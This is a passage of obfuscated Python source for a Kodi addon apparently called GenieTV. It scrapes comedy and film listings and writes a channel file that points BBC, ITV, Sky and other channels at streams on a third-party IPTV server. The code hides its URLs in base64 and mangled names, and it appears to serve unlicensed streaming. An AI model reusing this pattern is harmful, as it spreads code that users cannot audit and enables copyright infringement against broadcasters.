   if 35 - 35: i1IIi - OOooOOo * oo0OO
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 63 - 63: oo0OO * ii11ii1ii . OoooooooOO / iii11 * Oo . o0Oo0O0Oo00oO
def III1i1IiI1i ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( "url: '(.+?)'," ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  Ooo0 ( url )
  if 91 - 91: i1IIi - iIii1I11I1II1
  if 55 - 55: OOOo0 * OOooOOo % o0Oo0O0Oo00oO . iIii1I11I1II1 * O0o0Ooo
  if 92 - 92: O0o0Ooo - iIii1I11I1II1
def I11III111i ( ) :
 if 78 - 78: OoooooooOO
 ooOooo000oOO ( '[COLORgreen]Stand Up[/COLOR]' , '' , 10014 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Search Comedian[/COLOR]' , '' , 10015 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Others[/COLOR]' , '' , 10017 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 if 77 - 77: ii11ii1ii / i1IIi / Oo % iii11
def I1I1Iiii1 ( ) :
 OoOO = ooOOO0 ( ( i1111 ( 'aHR0cDovL2JhY2syYmFzaWNzYnVpbGQuY28udWsvdGVzdC9zdGFuZHVwbGlzdC5waHA=' ) ) )
 o0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( OoOO )
 for iI1i11 , o0O0o0 , OO in o0o :
  if 'elete' in OO :
   pass
  else :
   oOO0OO0OO ( '[COLORgreen]' + OO + '[/COLOR]' , iI1i11 , 222 , o0O0o0 )
   if 2 - 2: Ooo0OO0oOO + o0Oo0O0Oo00oO
def o00OoOoOo0OoO ( ) :
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 O0O0ooOOO = IIi1I1iiiii . lower ( )
 OoOO = ooOOO0 ( ( i1111 ( 'aHR0cDovL3d3dy5jb3VjaHRyaXBwZXIuY29tL2ZvcnVtMi9wYWdlLnBocD9wYWdlPTM=' ) ) )
 O00OO0o0 = re . compile ( '<tr>.+?<td width=".+?" align=".+?">.+?<img border=".+?" src="..(.+?)" width=".+?" height=".+?"></td>.+?<td width=".+?" valign=".+?" align=".+?"><font size=".+?">(.+?)</font></td>.+?<td width=".+?">(.+?)</td>' , re . DOTALL ) . findall ( OoOO )
 for o0O0o0 , oOOOooOo0O , iIiiiI1IiI1I1 in O00OO0o0 :
  for IIi1I1iiiii in oOOOooOo0O :
   print '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< img >>>>>>>>>>>>>>>>>>>>>>>>>>'
   III1i111i = re . compile ( '<a href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( iIiiiI1IiI1I1 )
   for iI1i11 , OO in III1i111i :
    if 'tube' in iI1i11 :
     pass
    elif 'stage' in iI1i11 :
     oOO0OO0OO ( '[COLORgreen]' + oOOOooOo0O + '   -   ' + OO + '[/COLOR]' , ( iI1i11 ) . replace ( '" target="_blank' , '' ) , 10016 , 'http://couchtripper.com/' + o0O0o0 , )
    elif 'vee' in iI1i11 :
     pass
     if 42 - 42: ii11ii1ii / i1IIi % I1IiI
def I11iiIIII1I1 ( ) :
 OoOO = ooOOO0 ( ( i1111 ( 'aHR0cDovL3d3dy5jb3VjaHRyaXBwZXIuY29tL2ZvcnVtMi9wYWdlLnBocD9wYWdlPTM=' ) ) )
 O00OO0o0 = re . compile ( '<tr>.+?<td width=".+?" align=".+?">.+?<img border=".+?" src="..(.+?)" width=".+?" height=".+?"></td>.+?<td width=".+?" valign=".+?" align=".+?"><font size=".+?">(.+?)</font></td>.+?<td width=".+?">(.+?)</td>' , re . DOTALL ) . findall ( OoOO )
 for o0O0o0 , oOOOooOo0O , iIiiiI1IiI1I1 in O00OO0o0 :
  III1i111i = re . compile ( '<a href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( iIiiiI1IiI1I1 )
  for iI1i11 , OO in III1i111i :
   if 'tube' in iI1i11 :
    pass
   elif 'stage' in iI1i11 :
    oOO0OO0OO ( '[COLORgreen]' + oOOOooOo0O + '   -   ' + OO + '[/COLOR]' , ( iI1i11 ) . replace ( '" target="_blank' , '' ) , 10016 , 'http://couchtripper.com/' + o0O0o0 )
   elif 'vee' in iI1i11 :
    pass
    if 38 - 38: O0o0Ooo % iii11 - OoooooooOO
    if 87 - 87: Ooo00oOo00o % OOOo0
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 77 - 77: iIii1I11I1II1 - i1IIi . OoIii111II
def iIi1iIIIiIiI ( url ) :
 OoOO = ooOOO0 ( url )
 print '>>>>>>>>>>>>>>>>>>>>>>>>' + url + '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<'
 o0000oO = re . compile ( "url\[.+?\] = '(.+?)';" ) . findall ( OoOO )
 print '>>>>>>>>>>>>>>>>>>>>>>>' + ( str ( o0000oO ) ) + '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
 for url in o0000oO :
  Ooo0 ( ( url ) . replace ( '[' , '' ) . replace ( ']' , '' ) . replace ( '\'' , '' ) )
  if 62 - 62: i11iIiiIii % iii11 . OoO0O0 . iii11
  if 84 - 84: i11iIiiIii * Ooo00oOo00o
  if 18 - 18: iii11 - ii11i1 - I1IiI / O0o0Ooo - O0
  if 30 - 30: O0 + ii11ii1ii + OoOoOO00
  if 14 - 14: OOooOOo / iii11 - iIii1I11I1II1 - OoIii111II % o0Oo0O0Oo00oO
  if 49 - 49: o0Oo0O0Oo00oO * OoIii111II / OOooOOo / Oo * iIii1I11I1II1
  if 57 - 57: I1IiI - OoIii111II / o0Oo0O0Oo00oO % i11iIiiIii
def I11oOOooo ( ) :
 if 80 - 80: OOOo0 - i11iIiiIii
 oOoooO000O ( '[COLOR darkgoldenrod]Open Pandora\'s Box[/COLOR]' , '' , 10029 , 'https://encrypted-tbn1.gstatic.com/images?q=tbn%3AANd9GcTQ9r4TA8yIw9ggxuwsHxWojo6tPVfgTe8QIOxOQwzNR2TavtCi6Q' , i1iiIII111ii , '' )
 oOoooO000O ( '[COLOR darkgoldenrod]Search[/COLOR]' , '' , 10026 , 'http://icons.iconarchive.com/icons/icontexto/search/256/search-red-dark-icon.png' , i1iiIII111ii , '' )
 if 49 - 49: OOooOOo * ii11i1 + Ooo0OO0oOO + oo0OO
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 30 - 30: OOooOOo / iii11 / OoO0O0 % o0Oo0O0Oo00oO + OoOoOO00
def I1III111i ( ) :
 oOoooO000O ( 'Search Pandoras Films' , '' , 10027 , 'http://icons.iconarchive.com/icons/icontexto/search/256/search-red-dark-icon.png' , i1iiIII111ii , '' )
 oOoooO000O ( 'Search Pandoras TV' , '' , 10028 , 'http://icons.iconarchive.com/icons/icontexto/search/256/search-red-dark-icon.png' , i1iiIII111ii , '' )
 if 4 - 4: i1IIi + o0Oo0O0Oo00oO + i1IIi
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
def i11IiIIi11I ( ) :
 if 78 - 78: OoO0O0
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 O0O0ooOOO = IIi1I1iiiii . lower ( )
 Oo0O0Oo00O = [ 'mova' , 'movb' , 'movc' , 'movd' , 'move' , 'movf' , 'movg' , 'movh' , 'movi' , 'movj' , 'movk' , 'movl' , 'movm' , 'movn' , 'movo' , 'movp' , 'movq' , 'movr' , 'movs' , 'movt' , 'movu' , 'movv' , 'movw' , 'movx' , 'movy' , 'movz' ]
 if 9 - 9: OOooOOo . OOOo0 - ii11ii1ii
 for IiiiI in Oo0O0Oo00O :
  iiIIi = IIiiiiiiIi1I1 + IiiiI + II11iiii1Ii
  OoOO = ooOOO0 ( iiIIi )
  o0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( OoOO )
  for iI1i11 , IIii1111 , o0OO0o0o00o , I1iI , OO in o0o :
   if IIi1I1iiiii in OO . lower ( ) :
    i1iiIIiI1iiI ( OO , iI1i11 , 222 , IIii1111 , I1iI , o0OO0o0o00o )
    if 18 - 18: oo0OO - OoIii111II % oo0OO / Ooo0OO0oOO
    Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
    xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
    if 68 - 68: ii11i1 * iIii1I11I1II1 + O0o0Ooo % I1IiI
    if 46 - 46: I1IiI % i1IIi / OoIii111II * Oo * iii11
def OOoOOOo0Ooo0 ( ) :
 if 80 - 80: ii11i1 - OOooOOo
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 O0O0ooOOO = IIi1I1iiiii . lower ( )
 Oo0O0Oo00O = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' , 'g' , 'h' , 'i' , 'j' , 'k' , 'l' , 'm' , 'n' , 'o' , 'p' , 'q' , 'r' , 's' , 't' , 'u' , 'v' , 'w' , 'x' , 'y' , 'z' ]
 if 41 - 41: OOooOOo - Oo * OOOo0
 for IiiiI in Oo0O0Oo00O :
  OO0OoOo0OOO = IIiiiiiiIi1I1 + IiiiI + II11iiii1Ii
  OoOO = ooOOO0 ( OO0OoOo0OOO )
  o0o = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( OoOO )
  for OO , o0OO0o0o00o , iI1i11 , o0O0o0 , I1iI , Ii1ii11IIIi in o0o :
   if IIi1I1iiiii in OO . lower ( ) :
    oOoooO000O ( OO , iI1i11 , Ii1ii11IIIi , o0O0o0 , I1iI , o0OO0o0o00o )
    if 82 - 82: OoIii111II * iIii1I11I1II1 . OOooOOo . ii11ii1ii + iii11 / OOOo0
    Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
    xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
    if 58 - 58: O0o0Ooo / o0Oo0O0Oo00oO + O0 + o0Oo0O0Oo00oO . iIii1I11I1II1 + OoOoOO00
    if 37 - 37: Ooo0OO0oOO . Oo % OoO0O0 * i1IIi
def oOOOO ( ) :
 if 48 - 48: O0o0Ooo + oo0OO
 iIIiiI1II1i11 = ooOOO0 ( IIiiiiiiIi1I1 + 'spongemain.php' )
 o0o = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for OO , o0OO0o0o00o , iI1i11 , o0O0o0 , I1iI , Ii1ii11IIIi in o0o :
  oOoooO000O ( OO , iI1i11 , Ii1ii11IIIi , o0O0o0 , I1iI , o0OO0o0o00o )
  Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
def Iiii1II1iI ( url ) :
 if 42 - 42: OoIii111II % OoooooooOO + OOooOOo
 xbmcplugin . addSortMethod ( handle = int ( sys . argv [ 1 ] ) , sortMethod = xbmcplugin . SORT_METHOD_TITLE )
 ooOO0o = ( '%s%s' % ( oO0O0oO0 , url ) )
 oOooo0O0o = ooOOO0 ( url )
 o0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( oOooo0O0o )
 for url , IIii1111 , o0OO0o0o00o , I11Ii1iI11iI1 , OO in o0o :
  i1iiIIiI1iiI ( OO , url , 222 , IIii1111 , I11Ii1iI11iI1 , o0OO0o0o00o )
  if 32 - 32: OOOo0
  Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
  if 78 - 78: I1IiI - Ooo00oOo00o % o0Oo0O0Oo00oO
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 80 - 80: O0o0Ooo . Ooo0OO0oOO
  if 73 - 73: I1IiI . O0 / oo0OO * OoIii111II
def i1iii1ii ( url ) :
 if 18 - 18: Ooo00oOo00o . OoOoOO00 % I1IiI % ii11i1
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for OO , o0OO0o0o00o , url , o0O0o0 , I1iI , Ii1ii11IIIi in o0o :
  oOoooO000O ( OO , url , Ii1ii11IIIi , o0O0o0 , I1iI , o0OO0o0o00o )
  if 87 - 87: iIii1I11I1II1 . OoooooooOO * I1IiI
  Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
  if 100 - 100: Ooo00oOo00o / i1IIi - OOOo0 % ii11i1 - iIii1I11I1II1
  if 17 - 17: Ooo0OO0oOO / OOooOOo % Oo
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 71 - 71: OoO0O0 . O0o0Ooo . Ooo00oOo00o
def i1iiIIiI1iiI ( name , url , mode , iconimage , fanart , description ) :
 if 68 - 68: i11iIiiIii % OoIii111II * Ooo00oOo00o * OoO0O0 * OoOoOO00 + O0
 o00OoO0oO00 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 iIi = True
 iiO0O0o0oO0O00 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 iiO0O0o0oO0O00 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 iiO0O0o0oO0O00 . setProperty ( "Fanart_Image" , fanart )
 iIi = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o00OoO0oO00 , listitem = iiO0O0o0oO0O00 , isFolder = False )
 return iIi
 if 70 - 70: O0o0Ooo + OoIii111II
def oOoooO000O ( name , url , mode , iconimage , fanart , description ) :
 if 93 - 93: O0o0Ooo + ii11i1
 o00OoO0oO00 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 iIi = True
 iiO0O0o0oO0O00 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 iiO0O0o0oO0O00 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 iiO0O0o0oO0O00 . setProperty ( "Fanart_Image" , fanart )
 iIi = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o00OoO0oO00 , listitem = iiO0O0o0oO0O00 , isFolder = True )
 return iIi
if 33 - 33: O0
if 78 - 78: O0 / OoOoOO00 * Ooo00oOo00o
if 50 - 50: OoooooooOO - iIii1I11I1II1 + i1IIi % O0o0Ooo - iIii1I11I1II1 % O0
if 58 - 58: OoO0O0 + iIii1I11I1II1
if 65 - 65: OoOoOO00 - O0o0Ooo % OOooOOo - I1IiI * oo0OO + ii11i1
if 79 - 79: o0Oo0O0Oo00oO . I1IiI % O0o0Ooo - Oo
if 69 - 69: o0Oo0O0Oo00oO - OOooOOo . o0Oo0O0Oo00oO
if 9 - 9: OoIii111II % i11iIiiIii / Oo
if 20 - 20: OoIii111II * O0 + Ooo0OO0oOO - OoooooooOO . Ooo0OO0oOO
if 60 - 60: OOooOOo . OOooOOo / oo0OO
if 45 - 45: O0 . i11iIiiIii % oo0OO . I1IiI % OoO0O0 % iIii1I11I1II1
if 58 - 58: iIii1I11I1II1 . I1IiI - i11iIiiIii * iIii1I11I1II1 % i11iIiiIii / OOOo0
if 80 - 80: ii11ii1ii / iIii1I11I1II1 % I1IiI
if 80 - 80: Ooo00oOo00o % oo0OO
if 99 - 99: o0Oo0O0Oo00oO / iIii1I11I1II1 - ii11i1 * ii11ii1ii % OOOo0
def i1II1i ( string ) :
 if iiiiiIIii == 'true' :
  xbmc . log ( "[addon.live.GenieTV-%s]: %s" % ( addon_version , string ) )
  if 10 - 10: ii11i1 - I1IiI . OoooooooOO . iii11 . Ooo00oOo00o * oo0OO
def OOOOOo ( name , url , iconimage , fanart , mode , playlist = None , regexs = None ) :
 I1IiiiIiI = [ ]
 try :
  if 77 - 77: ii11i1 / OoOoOO00 - ii11i1 / iii11
  name = name . encode ( 'utf-8' , 'ignore' )
 except :
  pass
 if os . path . exists ( o0 ) == False :
  i1II1i ( 'Making Favorites File' )
  I1IiiiIiI . append ( ( name , url , iconimage , fanart , mode , playlist , regexs ) )
  oOoooooOoO = open ( o0 , "w" )
  oOoooooOoO . write ( json . dumps ( I1IiiiIiI ) )
  oOoooooOoO . close ( )
 else :
  i1II1i ( 'Appending Favorites' )
  oOoooooOoO = open ( o0 ) . read ( )
  o0oO = json . loads ( oOoooooOoO )
  o0oO . append ( ( name , url , iconimage , fanart , mode ) )
  OOoOOo0O00O = open ( o0 , "w" )
  OOoOOo0O00O . write ( json . dumps ( o0oO ) )
  OOoOOo0O00O . close ( )
  if 29 - 29: oo0OO + i11iIiiIii % Ooo0OO0oOO
  if 93 - 93: I1IiI % iIii1I11I1II1
def Ooo0o0oo0 ( ) :
 oOO0 = json . loads ( open ( o0 ) . read ( ) )
 IIi1I1i = len ( oOO0 )
 for Ii in oOO0 :
  OO = Ii [ 0 ]
  iI1i11 = Ii [ 1 ]
  IIii1111 = Ii [ 2 ]
  try :
   oO0OOo00o0O0O = Ii [ 3 ]
   if oO0OOo00o0O0O == None :
    raise
  except :
   if o0oO0 . getSetting ( 'use_thumb' ) == "true" :
    oO0OOo00o0O0O = IIii1111
   else :
    oO0OOo00o0O0O = I1iI
  try : o0ooO0OoOo = Ii [ 5 ]
  except : o0ooO0OoOo = None
  try : o0oOO00 = Ii [ 6 ]
  except : o0oOO00 = None
  if 46 - 46: i11iIiiIii - Ooo0OO0oOO
  if Ii [ 4 ] == 0 :
   ooOooo000oOO ( OO , iI1i11 , '' , IIii1111 , I1iI , '' , 'fav' )
  else :
   ooOooo000oOO ( OO , iI1i11 , Ii [ 4 ] , IIii1111 , I1iI , '' , 'fav' )
   if 95 - 95: OoOoOO00
def oo000oO ( name ) :
 o0oO = json . loads ( open ( o0 ) . read ( ) )
 for O0OOO0 in range ( len ( o0oO ) ) :
  if o0oO [ O0OOO0 ] [ 0 ] == name :
   del o0oO [ O0OOO0 ]
   OOoOOo0O00O = open ( o0 , "w" )
   OOoOOo0O00O . write ( json . dumps ( o0oO ) )
   OOoOOo0O00O . close ( )
   break
 xbmc . executebuiltin ( "XBMC.Container.Refresh" )
 if 8 - 8: i11iIiiIii / OoOoOO00 + OOooOOo * ii11i1 % OoO0O0 . Ooo0OO0oOO
 if 6 - 6: OoO0O0 % Oo . Oo - ii11ii1ii / Ooo0OO0oOO . i1IIi
def Iiii1iI1i ( ) :
 oO0O0oO = os . path . join ( iIii1 , 'addons.ini' )
 IiIII = open ( oO0O0oO , "w+" )
 if 13 - 13: OOooOOo % OoIii111II / O0o0Ooo % O0o0Ooo % O0
 IiIII . write ( r'# This file contains the "built-in" channels' + '\n' )
 IiIII . write ( r'# It is parsed by Pythons ConfigParser' + '\n\n' )
 IiIII . write ( r'[plugin.video.GenieTv]' + '\n' )
 IiIII . write ( r'BBC One=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F191.m3u8&mode=10012&name=[COLORgreen]BBC+One%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'BBC Two=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F190.m3u8&mode=10012&name=[COLORgreen]BBC+Two%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'BBC Four=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F188.m3u8&mode=10012&name=[COLORgreen]BBC+Four%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'ITV=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F208.m3u8&mode=10012&name=[COLORgreen]ITV1%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'ITV2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F207.m3u8&mode=10012&name=[COLORgreen]ITV2%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'ITV3=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F206.m3u8&mode=10012&name=[COLORgreen]ITV3%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'ITV4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F205.m3u8&mode=10012&name=[COLORgreen]ITV4%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Channel 4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F183.m3u8&mode=10012&name=[COLORgreen]Channel+4%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Channel 5=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F185.m3u8&mode=10012&name=[COLORgreen]Channel+5%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'5STAR=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F187.m3u8&mode=10012&name=[COLORgreen]5%2A%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'5 USA=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F186.m3u8&mode=10012&name=[COLORgreen]5USA%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'RTE One=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F194.m3u8&mode=10012&name=[COLORgreen]RTE+One%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'RTE Two=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F193.m3u8&mode=10012&name=[COLORgreen]RTE+Two%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'TG4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F192.m3u8&mode=10012&name=[COLORgreen]TG4%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F32.m3u8&mode=10012&name=[COLORgreen]Sky+1%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F33.m3u8&mode=10012&name=[COLORgreen]Sky+2%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Living=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F35.m3u8&mode=10012&name=[COLORgreen]Sky+Living%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Atlantic=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F34.m3u8&mode=10012&name=[COLORgreen]Sky+Atlantic%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Dave=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F325.m3u8&mode=10012&name=[COLORgreen]Dave%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Pick=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F324.m3u8&mode=10012&name=[COLORgreen]Pick%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'GOLD=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F326.m3u8&mode=10012&name=[COLORgreen]Gold%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Watch HD=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F518.m3u8&mode=10012&name=[COLORgreen]Watch%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'YESTERDAY=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F377.m3u8&mode=10012&name=[COLORgreen]Yesterday%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Comedy Central=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F181.m3u8&mode=10012&name=[COLORgreen]Comedy+Central%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'London Live=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F830.m3u8&mode=10012&name=[COLORgreen]London+Live%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Disney Junior=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F230.m3u8&mode=10012&name=[COLORgreen]Disney+Jr.%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Disney Chnl=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F231.m3u8&mode=10012&name=[COLORgreen]Disney+Channel%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Animal Planet=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F198.m3u8&mode=10012&name=[COLORgreen]Animal+Planet%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Nat Geo=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F197.m3u8&mode=10012&name=[COLORgreen]National+Geographic+Channel%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Discovery=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F200.m3u8&mode=10012&name=[COLORgreen]Discovery+Channel%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Discovery Science=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F199.m3u8&mode=10012&name=[COLORgreen]Discovery+Science%0D[%2FCOLOR]' + '\n' )
